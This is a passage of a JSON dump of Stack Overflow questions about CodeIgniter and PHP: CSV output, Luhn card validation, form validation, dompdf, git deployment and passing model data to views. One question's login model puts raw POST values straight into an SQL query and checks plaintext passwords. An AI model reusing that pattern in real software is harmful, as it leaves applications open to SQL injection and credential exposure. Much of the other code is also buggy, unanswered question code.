$row-&gt;Nama_Material_Jasa;?&gt;&lt;/td&gt;  \n                    &lt;/tr&gt;  ?&gt;\n                    &lt;?php  \n                     $no++;  \n                    }  \n                   } else { ?&gt;  \n                                &lt;tr id=\"row\"&gt;  \n                                &lt;td colspan=\"6\" align=\"center\"&gt;Data tidak ditemukan&lt;/td&gt;  \n                               //the screen shows 'data tidak ditemukan' &lt;/tr&gt;  \n                            &lt;?php  \n                   }  \n                   ?&gt;  \n</code></pre>\n\n<p>this is so confusing, since i can see the data in the controller, then pass them into the views, views said no data received</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12852712,"title":"displaying the array from the post php","body":"<p>I have an multiple divs which are formed dynamically. Inside each div i have a list of checkboxes and a single dropdown. The list of checkboxes contain the hotel name and category and a single dropdown containing the hotel rating. The user can select the checkboxes or select an option from the dropdown. By default is the checkbox. If the user does not select the checkbox then the value of the dropdown should be taken into consideration for the particular city.</p>\n\n<p>This is the code that i have tried in the controller but i am not getting the desired result. Can someone help me with this pls?</p>\n\n<pre><code>       if (isset($_POST['city'])) {\n                $city = $_POST['city'];\n                if (is_array($city)) {\n                    foreach ($this-&gt;input-&gt;post('city') as $city) {\n                        $cityid[] = $city;\n                        // $category.= $this-&gt;input-&gt;post('category_' . $city) . \",\";\n                        // $categorycity.= $city . \",\";\n                        //   $prefsightseeing.= $this-&gt;input-&gt;post('prefsight_' . $city) . \",\";\n                        //   $prefsightseeingcity.= $city . \",\";\n                        //$hotel = $_POST['hotel'];\n\n                        if (isset($_POST['hotel'])) {\n                            $hotel = $_POST['hotel'];\n\n                         //   if (is_array($hotel) &amp;&amp; in_array($city, $hotel)) {\n                                foreach ($this-&gt;input-&gt;post('hotel') as $city_id) {\n                                    $arr = explode('_', $city_id);\n                                    if (in_array($arr[1], $cityid)) {\n                                        $hotelcityid.= $arr[1] . ',';\n                                        $hotelid.= $arr[2] . ',';\n                                    }\n\n                           //     }\n                            }\n                        } \n\n                       else{     if (isset($_POST['category'])) {\n                                $category = $_POST['category'];\n                                foreach ($this-&gt;input-&gt;post('category') as $category) {\n                                    $arr = explode('_', $category);\n                                  // echo $arr[1];\n                                   // print_r($cityid);\n                                    if (in_array($arr[1], $cityid)) {\n                                        $hotelcategory.= $arr[0] . ',';\n                                        $categorycity.= $city . ',';\n                                      }\n                                }\n                            }\n                       }\n                        //  $hotelid.= $arr[2] . ',';\n                    }\n                    $categorycity = rtrim($categorycity, ',');\n                    $category = rtrim($hotelcategory, ',');\n                  $category=  implode(',', array_keys(array_flip(explode(',', $category))));\n$categorycity=  implode(',', array_keys(array_flip(explode(',', $categorycity))));\n\n                    // $prefsightseeing = rtrim($prefsightseeing, ',');\n                    // $prefsightseeingcity = rtrim($prefsightseeingcity, ',');\n                }\n            }\n            if ($category != \"\") {\n\n                $arrData['HotelInfoByCategory'] = $this-&gt;previewpackage_model-&gt;get_hotel_info_by_category($category, $categorycity);\n            }\n</code></pre>\n\n<p>Thanks,</p>\n"},{"tags":["php","codeigniter","csv"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":321,"score":2,"question_id":7996437,"title":"When creating a CSV file, how do I handle \\n and \\r characters in a field?","body":"<p>I am writing a function to handle CSV output using <a href=\"http://www.php.net/manual/en/function.fputcsv.php\" rel=\"nofollow\"><code>fputcsv()</code></a>. I've worked around the dreaded <code>\\r\\n</code> issue that so many people have had with <code>fputcsv()</code> (see code).</p>\n\n<p>Now I'm trying to figure out how to handle <code>\\r</code> or <code>\\n</code> characters that are included in a field (not the line ending returns <code>\\r\\n</code>). Should it be escaped somehow before being passed into <code>fputcsv()</code>? </p>\n\n<p>The function handles escaping well for most characters. But, when a <code>\\n</code> is inserted into a field, both MS Excel and Google Docs have problems with the <code>\\n</code> and the CSV fails to load properly.</p>\n\n<pre><code>/*\n* Revised Get CSV Line using PHP's fputcsv()\n* \n* Used to correct an issue with fputcsv()\n* http://stackoverflow.com/questions/4080456/fputcsv-and-newline-codes\n* MS Excel needs the MS Windows newline format of \\r\\n\n* \n*/\n\nif (!function_exists('get_csv_line'))\n{\n    function get_csv_line($list,  $seperator = \",\", $enclosure = '\"', $newline = \"\\r\\n\")\n    {\n        $fp = fopen('php://temp', 'r+'); \n\n        fputcsv($fp, $list, $seperator, $enclosure );\n        rewind($fp);\n\n        $line = fgets($fp);\n        if ($newline &amp;&amp; $newline != \"\\n\") {\n            if ($line[strlen($line)-2] != \"\\r\" &amp;&amp; $line[strlen($line)-1] == \"\\n\") {\n                $line = substr_replace($line,\"\",-1) . $newline;\n            } else {\n                die( 'original csv line is already \\r\\n style' );\n            }\n        }\n        if ($newline == \"\\r\\n\" &amp;&amp; substr($line, -2) != \"\\r\\n\") {\n            log_message('error', 'function get_csv_line: Error, needs \\r\\n to be MS Excel friendly!');\n        }\n        return $line;\n    }\n}\n</code></pre>\n"},{"tags":["php","codeigniter","licensing","trademark"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":515,"score":6,"question_id":1669944,"title":"Can I use an open source framework in a project I plan to profit from?","body":"<p>I'm building a CMS on codeigniter. I'm modifying codeigniter in small ways to make it work with my ideas more seamlessly. But I wonder - are there any restrictions on how I can profit from it? I would think I could build a website with the CMS and charge for it. But what if say, later on I buy a server and set up several accounts for several users of my CMS, and each one remotely controls several different sites, that may or may not be created by me -- can I charge for the use of it then? What if much later on I modify it to do lots of neat stuff for local networks, can I sell licenses for people to set it up on site?</p>\n\n<p>Not that I'm expecting to get that far with it, but I have some nice ideas for it that I haven't seen in CMS software before, and if they are well received, well I just want to know if there is a legal side to this if I use something like codeigniter to build it.</p>\n\n<p>Would I be better off building my own small framework specific to this project?</p>\n"},{"tags":["php","codeigniter","credit-card"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":519,"score":0,"question_id":8484671,"title":"What is the best way to validate a credit card in codeigniter","body":"<p>hi i am using codeigniter . i want to validate my credit card details . i saw there are classes in php to validate credit card numbers . i saw a helper in codeigniter to validate credit cards</p>\n\n<p><a href=\"http://codeigniter.com/wiki/Credit_Card_Helper\" rel=\"nofollow\">http://codeigniter.com/wiki/Credit_Card_Helper</a></p>\n\n<pre><code>/**\n * Truncates a card number retaining only the first 4 and the last 4 digits.  It then returns the truncated form.\n *\n * @param string The card number to truncate.\n * @return string The truncated card number.\n */\nfunction truncate_card($card_num) {\n    $padsize = (strlen($card_num) &lt; 7 ? 0 : strlen($card_num) - 7);\n    return substr($card_num, 0, 4) . str_repeat('X', $padsize). substr($card_num, -3);\n}\n\n\n/**\n * Validates a card expiry date.  Finds the midnight on first day of the following \n * month and ensures that is greater than the current time (cards expire at the \n * end of the printed month).  Assumes basic sanity checks have already been performed \n * on month/year (i.e. length, numeric, etc).\n *\n * @param integer The expiry month shown on the card.\n * @param integer The expiry year printed on the card.\n * @return boolean Returns true if the card is still valid, false if it has expired.\n */\nfunction card_expiry_valid($month, $year) {\n    $expiry_date = mktime(0, 0, 0, ($month + 1), 1, $year);\n    return ($expiry_date &gt; time());\n}\n\n\n/**\n * Strips all non-numerics from the card number.\n *\n * @param string The card number to clean up.\n * @return string The stripped down card number.\n */\nfunction card_number_clean($number) {\n    return ereg_replace(\"[^0-9]\", \"\", $number); \n}\n\n\n/**\n * Uses the Luhn algorithm (aka Mod10) &lt;http://en.wikipedia.org/wiki/Luhn_algorithm&gt; \n * to perform basic validation of a credit card number.\n *\n * @param string The card number to validate.\n * @return boolean True if valid according to the Luhn algorith, false otherwise.\n */\nfunction card_number_valid ($card_number) {\n    $card_number = strrev(card_number_clean($card_number));\n    $sum = 0;\n\n    for ($i = 0; $i &lt; strlen($card_number); $i++) {\n      $digit = substr($card_number, $i, 1);\n\n        // Double every second digit\n        if ($i % 2 == 1) {\n          $digit *= 2;\n        }\n\n        // Add digits of 2-digit numbers together\n        if ($digit &gt; 9)    {\n          $digit = ($digit % 10) + floor($digit / 10);\n        }\n\n        $sum += $digit;\n    }\n\n    // If the total has no remainder it's OK\n    return ($sum % 10 == 0);\n}\n?&gt; \n</code></pre>\n\n<p>it uses a common validation . but i want a validation according to card type like this </p>\n\n<p><a href=\"http://www.braemoor.co.uk/software/creditcard.php\" rel=\"nofollow\">http://www.braemoor.co.uk/software/creditcard.php</a></p>\n\n<p>is there any libraries or helpers in codeigniter . please help.....................</p>\n"},{"tags":["php","codeigniter","expressionengine"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12729899,"title":"Expression Engine Allowed File Types Option","body":"<p>When creating an upload destination in EE2 is it possible to add more options to the \"Allowed File Types\" drop down <a href=\"http://expressionengine.com/user_guide/cp/content/files/file_upload_preferences.html#allowed-file-types\" rel=\"nofollow\">http://expressionengine.com/user_guide/cp/content/files/file_upload_preferences.html#allowed-file-types</a> as it only gives you two options \"ALL\" or \"Image\". This seems a bit insecure if you want to create a frontend PDF upload to have to select the \"ALL\" option. </p>\n\n<p>What would be ideal is if I could make a file group and select the appropriate MIME types</p>\n"},{"tags":["php","codeigniter","rss","itunes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":157,"score":0,"question_id":8517049,"title":"iTunes Podcast RSS PHP Tracking - Not Downloading","body":"<p>I am trying to track downloads of MP3 Podcasts in iTunes. I have created a simple codeignitor site which generates URLS like:</p>\n\n<p>www.site.com/podcasts/download/[id].mp3</p>\n\n<p>The script takes the ID out of the URL, checks it exists in the DB - Gets the URL of the files and then does the following: </p>\n\n<pre><code>header(\"Cache-Control: no-cache, must-revalidate\");\nheader(\"Expires: Sat, 01 Jan 2011 01:01:01 GMT\"); \nheader('Content-type: audio/mpeg');\nheader('Content-Disposition: attachment; filename=episode'.$id.'.mp3\"');\nreadfile($this-&gt;podcast_model-&gt;get_strPodcastFileName());   \n</code></pre>\n\n<p>If you hit the URL in a browser it works and the file starts to download, but when putting 1 link into iTunes it starts saying \"Downloading 0%\" but does not download?</p>\n\n<p>The 1 thing to note is the method: $this->podcast_model->get_strPodcastFileName() returns a HTTP:// link and not a link to a file on the server, also the HTTP address is not on the same server as the script. Although this is working when downloading the files via the browser as I said above. </p>\n\n<p>Does anyone have any ideas?</p>\n\n<p>Thanks\nJames</p>\n"},{"tags":["php","jquery","codeigniter","jquery-ajax","phpmyadmin"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":9373599,"title":"How to store X and Y Coordinated of any specific drag n drop div?","body":"<p>I am new to codeigniter and working on E-cards. I am using drag n drop jquery which is working smoothly. I am facing some problem when I am trying to store X and Y coordinates of that drag-able \"DIV\" into my database. \nIs any solution or helping material to that problem? \nOr how can I get X and Y coordinates and store it to my db?\nwould be very grateful for me.</p>\n\n<p>Thanks. </p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12850555,"title":"db active records","body":"<p>I'm trying to get some data from my database with active records,and I'm having the following problem. I wanna learn how to do it with active records since after this code i have a ton of joins and other stuff. Otherwise I would write a normal query.</p>\n\n<pre><code>        $this-&gt;db-&gt;where(\"sa.country\", $country);\n\n\n         // I NEED TO OPEN BRACKETS HERE SO THAT I CAN GET THE LANGUAGES IF THERE IS DATA IN ONE OF THE ARRAYS\n\n\n        if (isset($lid[0]))$this-&gt;db-&gt;where(\"sa.lang\", $lid[0]);\n        if (isset($lid[1]))$this-&gt;db-&gt;or_where(\"sa.lang\", $lid[1]);\n        if (isset($lid[2]))$this-&gt;db-&gt;or_where(\"sa.lang\", $lid[2]);\n        if (isset($lid[3]))$this-&gt;db-&gt;or_where(\"sa.lang\", $lid[3]);\n        if (isset($lid[4]))$this-&gt;db-&gt;or_where(\"sa.lang\", $lid[4]);\n\n\n        //AND CLOSE THEM HERE\n</code></pre>\n\n<p>My goal is to get a specific country from db, with the corresponding languages that are in the arrays.</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12846738,"title":"CodeIgniter Login Error","body":"<p>Hello when i try to log in using code igniter i run into this error</p>\n\n<pre><code>The action you have requested is not allowed.\n</code></pre>\n\n<p>This is my config for the csrf:</p>\n\n<pre><code>$config['csrf_protection'] = TRUE;    \n$config['csrf_token_name'] = 'csrf_token_name';    \n$config['csrf_cookie_name'] = 'csrf_cookie_name';   \n$config['csrf_expire'] = 7200;\n</code></pre>\n\n<p>Well it's a custom made CMS for world of warcraft emulation called FusionCMS it's using php connected to a MySQL database.</p>\n"}]}
{"total":13987,"page":10,"pagesize":100,"questions":[{"tags":["php","codeigniter","session","cookies","control"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":12841698,"title":"Codeigniter - check if session and cookies enabled","body":"<p>How do you control from hooks files if the session and the cookies are enabled on user browser?</p>\n\n<p>this is my code unfortunately it doesn't works:</p>\n\n<p>cookie.php (/hooks)\n    class Cookie {</p>\n\n<pre><code>function control_cookies_enabled()\n{\n $CI =&amp; get_instance();\n $CI-&gt;session-&gt;unset_userdata('enabled_cookies',false);\n $CI-&gt;session-&gt;set_userdata('enabled_cookies','1');\n\n if($CI-&gt;session-&gt;userdata('enabled_cookies') !== '1'){\n  redirect(site_url('home'));\n }\n}\n\n}\n</code></pre>\n\n<p>then i call that in /config/hooks.php</p>\n\n<pre><code> $hook['pre_controller'] = array(\n                                'class'    =&gt; 'cookie',\n                                'function' =&gt; 'control_cookies_enabled',\n                                'filename' =&gt; 'cookie.php',\n                                'filepath' =&gt; 'hooks'\n\n                                );\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["php","codeigniter","video-thumbnails","grocery-crud"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":119,"score":0,"question_id":12840197,"title":"Grocery CRUD multiple upload field","body":"<p>I am working on the admin section of a website in codeigniter. I am using Grocery CRUD for the<br>\nadd edit delete operations. I've used 'set_field_upload' function to provide a video upload field inside the form. I need to add a thumbnail for the video, so require another upload field. \nIs it possible to implement multiple upload field inside the form using grocery crud? Are there any other methods to create thumbnail other than ffmpeg ?</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":12836444,"title":"Unable to retrieve bulk records using PHP and MySQL","body":"<p>I have a table in MySQL with the structure:</p>\n\n<pre><code>id int(10) PRIMARY,\napp_no varchar(255)\n</code></pre>\n\n<p>and <code>INDEX appno_index</code> of type <code>BTREE</code> on field app_no</p>\n\n<p>Now this table has 900000 + records in it. I am using CodeIgniter model to list the records.\nMy query for the listing of records in CodeIgniter is </p>\n\n<pre><code>$query = $this-&gt;db-&gt;query(\"SELECT id, app_no FROM `app_no` USE INDEX(appno_index)\");\n</code></pre>\n\n<p>But MySQL throws error like this. </p>\n\n<p><strong>Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 24 bytes) in C:\\wamp\\www\\~\\system\\database\\drivers\\mysql\\mysql_result.php on line 162</strong></p>\n\n<p>How do I optimize my query using anything so that the page displays all the records?</p>\n"},{"tags":["php","database","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12833504,"title":"how to check user permission given to user (code igniter )","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4977707/codeigniter-authentication-user-privileges\">CodeIgniter authentication + user privileges</a>  </p>\n</blockquote>\n\n\n\n<p>I had 5 user type and  have permission table in which i give differnt permission to different user . permission like is_view,is_delete,is_add etc . User access the feature according to these permission. </p>\n\n<p>I complete Database. I want to check the permission given to user on each page before the controller is called.   </p>\n"},{"tags":["php","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12832491,"title":"Simple Codeigniter form validation","body":"<p>I am having some problem in my login form like this</p>\n\n<p><img src=\"http://i.stack.imgur.com/cU996.png\" alt=\"enter image description here\"></p>\n\n<p>I want to display an individually error beside of each field</p>\n\n<p>here is the controller</p>\n\n<pre><code>function index()\n{      \n        $this-&gt;form_validation-&gt;set_rules('username','Username','trim|required|exact_length[4]|xss_clean');\n        $this-&gt;form_validation-&gt;set_rules('password','Password','trim|required|min_length[4]|max_length[40]|xss_clean|callback_login');\n        $this-&gt;form_validation-&gt;set_rules('jabatan','Jabatan','trim|required|xss_clean');\n\n        if($this-&gt;form_validation-&gt;run() == false)\n        {\n            $this-&gt;load-&gt;view('login');\n        }\n        else\n        {\n            $this-&gt;load-&gt;view('welcome_message');\n        }\n\n}\n\nfunction login()\n{\n    $username = $this-&gt;input-&gt;post('username');\n    $password = $this-&gt;input-&gt;post('password');\n    $jabatan = $this-&gt;input-&gt;post('jabatan');\n\n    $value = $this-&gt;m_login-&gt;login($username,$password,$jabatan);\n\n    if($value)\n    {\n        return true;\n    }\n    else\n    {\n        $this-&gt;form_validation-&gt;set_message('login', 'password salah');\n        //delete redirect() and showing blank white screen\n        return false;\n\n    }\n</code></pre>\n\n<p>I made the <code>&lt;?php echo form_error(); ?&gt;</code> beside each field</p>\n\n<pre><code>&lt;?php echo form_open('c_login/login'); ?&gt;\n            &lt;table&gt;\n                &lt;tr&gt;\n                    &lt;td&gt;Username&lt;/td&gt;\n                    &lt;td&gt;&lt;?php $inusername=array('name' =&gt; 'username', 'class' =&gt; 'GUI'); echo form_input($inusername); ?&gt;&lt;/td&gt;\n                    &lt;td class=\"error\"&gt;&lt;?php echo form_error('username'); ?&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n\n                &lt;tr&gt;\n                    &lt;td&gt;Password&lt;/td&gt;\n                    &lt;td&gt;&lt;?php $inpassword=array('name' =&gt; 'password', 'class' =&gt; 'GUI', 'type' =&gt;'password'); echo form_input($inpassword); ?&gt;&lt;/td&gt;\n                    &lt;td class=\"error\"&gt;&lt;?php echo form_error('password'); echo $this-&gt;session-&gt;flashdata('login'); ?&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n\n                &lt;tr&gt;\n                    &lt;td&gt;Jabatan&lt;/td&gt;\n                    &lt;td&gt;&lt;?php $injabatan=array('keuangan' =&gt; 'keuangan', 'admin' =&gt; 'admin', 'hd' =&gt; 'head divisi', 'direktur' =&gt; 'direktur'); echo form_dropdown('jabatan',$injabatan,'keuangan','class = \"gui\"'); ?&gt;&lt;/td&gt;\n                    &lt;td class=\"error\"&gt;&lt;?php echo form_error('jabatan'); ?&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n\n                 &lt;tr&gt;\n                    &lt;td&gt;&lt;/td&gt;\n                    &lt;td&gt;&lt;?php $insubmit=array('name' =&gt;'login','class' =&gt;'button','value' =&gt; 'Login'); echo form_submit($insubmit); echo nbs(); $inreset=array('name' =&gt;'reset','class' =&gt;'button','value' =&gt; 'Hapus'); echo form_reset($inreset); ?&gt;&lt;/td&gt;\n                    &lt;td class=\"error\"&gt;&lt;?php echo form_error(); ?&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n            &lt;/table&gt;\n            &lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>How come the <code>form_error()</code> function is not <code>echo</code>ing anything when I click login with the <code>username</code> and <code>password</code> field left blank?</p>\n"},{"tags":["codeigniter","export","word","force-download"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":974,"score":1,"question_id":7258868,"title":"PHPWord class in CodeIgniter is not generating correct, throwing errors in word file","body":"<p>Ok, so I'm having difficulty with the PHPWord class which can be found: <a href=\"http://phpword.codeplex.com\" rel=\"nofollow\">http://phpword.codeplex.com</a></p>\n\n<p>The weird thing about it is when I use this same code in the \"example\" file it works fine in generating. When I don't force a download using headers the file will open up just fine. Using this code though with the headers is causing it when it downloads to throw errors in the word file saying the file is corrupt and can't be opened, but then it opens up just fine.</p>\n\n<pre><code>public function export()\n    {\n            // Load PHPWORD Library\n            $this-&gt;load-&gt;library('PHPWord');\n            $sec = $this-&gt;phpword-&gt;createSection($secStyle);\n\n            $header = $sec-&gt;createHeader();\n            $header-&gt;addWatermark('images/CC_watermark.png', array('marginTop'=&gt;1015, 'marginLeft'=&gt;-80));\n\n            $resultSelected = $this-&gt;input-&gt;post('cbox');\n            foreach($resultSelected as $row)\n            {\n               $sec-&gt;addText($row);\n               echo $row.\"&lt;br&gt;\";\n            }\n\n            $fileName = \"Plan_Generate_\".date('Ymd').\".docx\";\n\n            // Force Download\n            $filePath = $fileName;\n\n               $fileName = basename($filePath);\n               // $fileSize = filesize($filePath);\n\n               // Output headers.\n               header(\"Cache-Control: private\");\n               header(\"Content-Type: application/stream\");\n               // header(\"Content-Length: \".$fileSize);\n               header(\"Content-Disposition: attachment; filename=\".$fileName);\n\n               // Output file.\n               // readfile ($filePath);\n               // exit();\n\n\n            // Save File\n            // $fileName = \"files/SomethingNew_\".date(\"Ymd\").\".docx\";\n            $objWriter = PHPWord_IOFactory::createWriter($this-&gt;phpword, 'Word2007');\n            $objWriter-&gt;save('php://output');\n    }\n</code></pre>\n\n<p>This is the code i'm using when trying to generate the file. The trouble I'm having is it's throwing an error when it tries to force download. Thanks for any help! Ask questions if you don't fully understand the question.</p>\n\n<p>Update:</p>\n\n<p>Here's the image of the error's I'm receiving. Thanks for the quick responses and I'm actually going to try the Codeigniters way of doing it Tomm. morning.</p>\n\n<p><img src=\"http://i.stack.imgur.com/9Hs8A.jpg\" alt=\"Word Errors\"></p>\n"},{"tags":["php","codeigniter","dompdf","internal-server-error"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12827063,"title":"dompdf and codeigniter - error 500 when execute load_html","body":"<p>I have an error 500 with this code:</p>\n\n<pre><code>require_once FCPATH.'application/helpers/dompdf/dompdf_config.inc.php';\n$dompdf = new DOMPDF();\n$dompdf-&gt;load_html( $html );\n$dompdf-&gt;render();\n$pdf = $dompdf-&gt;output();\nfile_put_contents( './tmp/'.$filename.'.pdf' , $pdf );\n</code></pre>\n\n<p>With some debug, I find that the \"evil\" code is this</p>\n\n<pre><code>$dompdf-&gt;load_html( $html );\n</code></pre>\n\n<p>And I don't know how to solve this.</p>\n\n<p>Even the \"ini_set\" instruction with memory_limit and max_execution_time doesn't fix this problem..</p>\n"},{"tags":["php","codeigniter","multilingual","multilanguage","multi-language"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":12850794,"title":"htmlentities content that has HTML","body":"<p>I'm trying to support multiple languages on my site. Some of the content that needs translating will have entity references like <code>Ç</code>. I could use <code>htmlentities</code> to convert that into a <code>&amp;Atilde;</code>. However, what if I need to translate a string that has mark up:</p>\n\n<pre><code>\"&lt;p&gt;Hello, &lt;a href=\"\"&gt;world with Ç&lt;/a&gt;&lt;/p&gt;\"\n</code></pre>\n\n<p>If I use <code>htmlentities</code>, the <code>&lt;</code> and <code>&gt;</code> would be converted, too. I don't want to break down the string into tags and non-tag parts, then apply <code>htmlentities</code> only to the non-tag parts. That'll be too messy and tedious.</p>\n"},{"tags":["git","codeigniter","ssh","shared-hosting"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1254,"score":1,"question_id":4675152,"title":"Git push to live server through limited ssh","body":"<p>I'm using GitHub to keep track of my source code. Although I work alone, it comes really handy to test new features and rollback if it doesn't work. So, I installed in Git Bash in my windows machine, and commit &amp; push to github when the code is ready.</p>\n\n<p>Now, I want to take this further and deploy from the same terminal. My shared-hosting has SSH access but is kinda limited. They told me they had Git, but only as a client, to read repos. I don't know what that means. </p>\n\n<p>I was trying to make a repo on the live server, add it as remote on my machine and then just 'git push remote live' but that didn't work.</p>\n\n<p>Whenever I type 'git init' on the live server it returns:</p>\n\n<pre>\nwarning: templates not found /usr/share//git-core/templates/\n\nInitialized empty Git repository in /www/example.com.ar/htdocs/example.com.ar/.git/\n\n</pre>\n\n<p>And I can't 'git clone' or 'git pull' or anything!</p>\n\n<p>Is there any tips you can give me? I'm just tired of drag&amp;dropping my folder via FTP, it just feels so wrong!</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12849715,"title":"My Default Controller Can Not Find the Parent Controller","body":"<p><strong>My application is working totally fine in development environment. Once i uploaded it to my production server, i got the following error:</strong></p>\n\n<blockquote>\n  <p>Parse error: syntax error, unexpected T_FUNCTION, expecting ‘)’ in\n  /home/fjamal/public_html/<strong><em>*</em></strong>/anyname/application/config/config.php\n  on line 27</p>\n</blockquote>\n\n<p><strong>The errors refers to the following code:</strong></p>\n\n<pre><code>spl_autoload_register(function($class)\n{\n if (strpos($class, 'CI_') !== 0)\n {\n  if (file_exists($file = APPPATH . 'core/' . $class . EXT))\n  {\n   include $file;\n  }\n  elseif (file_exists($file = APPPATH . 'libraries/' . $class . EXT))\n  {\n   include $file;\n  }\n }\n}); \n</code></pre>\n\n<p><strong>If i change the above code to the older version as:</strong></p>\n\n<pre><code>function __autoload($class)\n{\n if (strpos($class, 'CI_') !== 0)\n {\n  if (file_exists($file = APPPATH . 'core/' . $class . EXT))\n  {\n   include $file;\n  }\n  elseif (file_exists($file = APPPATH . 'libraries/' . $class . EXT))\n  {\n   include $file;\n  }\n }\n}  \n</code></pre>\n\n<p><strong>I get the following error:</strong></p>\n\n<blockquote>\n  <p>Fatal error: Class ‘Frontend_Controller’ not found in\n  /home/fjamal/public_html/<strong><em>*</em>*</strong>/anyname/application/controllers/home.php\n  on line 4</p>\n</blockquote>\n\n<p><strong>Explanation of the error:</strong> my controller extends from Frontend_Controller which resides in Libraries folder. Frontend_Controller extends from MY_Controller which resides under core folder. For some reason, all these problems in the production environment, i don’t get it in my localhost. Hence, home is default controller.</p>\n\n<p><em><strong>This error stops the application from running, i couldn’t figure it out at all. Any help will be appreciated.</em></strong></p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12849725,"title":"How to pass multiple model functions from controller to view in codeigniter?","body":"<h1>Controller</h1>\n\n<p>I have multiple functions from the <code>model</code> passing data to the <code>view</code></p>\n\n<p>I was doing this successfully like this:</p>\n\n<pre><code>$var1 = $this-&gt;model_name-&gt;function_name();\n$var2 = $this-&gt;model_name-&gt;function_name();\n$var3 = $this-&gt;model_name-&gt;function_name();\n\n$data = $var1 + $var2 + $var3; \n\n$this-&gt;load-&gt;view('page_name', $data);\n</code></pre>\n\n<p>Now I am using the above method in other areas which is working flawlessly. However I am getting an error <strong>Fatal error: Unsupported operand types</strong> What happened? Why was it working an hour ago and suddenly broke without modification to the code.. </p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12846547,"title":"Checking the database and redirectering to the particular page","body":"<p>If the admin login  checked is correct it should redirect to dashboard page, but if admin login is correct or incorrect it is going to dashboard page. If it is incorrect it should go to login page.</p>\n\n<p>Here is the code</p>\n\n<pre><code>&lt;?php \nclass Validate extends CI_Model\n{\n    public function checkdatabase()\n    {\n        $username=$_POST['username'];\n        $password=$_POST['password'];\n        //echo $username;\n        $this-&gt;load-&gt;database();\n         $query =\"select * from adminlogin where name='$username' AND password='$password'\";\n    $value = $this-&gt;db-&gt;query($query);\n    $data = $value-&gt;result();\n    return $data;\n\n    }\n}\n?&gt;\n</code></pre>\n\n<p>Here is the condition in the controller</p>\n\n<pre><code>if($value=$this-&gt;validate-&gt;checkdatabase()){\n    redirect('dashboard', 'refresh');\n    }else{\n    $this-&gt;load-&gt;view('admin/login');\n    }   \n</code></pre>\n"},{"tags":["php","codeigniter","foreach"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12849011,"title":"DB query is not getting all records as defined","body":"<h1>Model</h1>\n\n<pre><code>    $id = $this-&gt;session-&gt;userdata('id');\n\n    $q = $this-&gt;db-&gt;get_where('shipping_address', array('customer_id' =&gt; $id));\n\n    if ($q-&gt;num_rows == 0)\n    {\n        $data['id'] = 'You dont have a shipping address saved.';\n\n    } else {\n        foreach ($q-&gt;result() as $row) \n            {\n            $data['first'] = $row-&gt;firstname;\n            $data['last'] = $row-&gt;lastname;\n            }\n    }\n    return $data;\n</code></pre>\n\n<h1>Controller</h1>\n\n<pre><code>    $this-&gt;load-&gt;model('Customer_accounts');\n\n        $customer = $this-&gt;Customer_accounts-&gt;get_customer_info();\n        $ship = $this-&gt;Customer_accounts-&gt;shipping_address();\n\n        $data = $ship + $customer;\n\n    $this-&gt;load-&gt;view('account_dashboard/personal_information', $data);\n</code></pre>\n\n<h1>View</h1>\n\n<pre><code>&lt;?php foreach ($ship as $row) : ?&gt;\n    &lt;table class=\"fixCap\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"&gt;\n      &lt;tr&gt;\n        &lt;td&gt;&lt;?php echo $row['firstname'] . $row['lastname']; ?&gt;&lt;/td&gt; \n      &lt;/tr&gt;\n\n           . . .\n\n      &lt;/tr&gt;\n    &lt;/table&gt;\n&lt;?php endforeach; ?&gt;    \n</code></pre>\n\n<h1>Var_dump</h1>\n\n<p>Is only showing an <code>array</code> with 1 of the the table <code>rows</code> but it should be showing 2 rows which contain the defined <code>customer_id</code> </p>\n\n<h1>Problem</h1>\n\n<p>Unable to 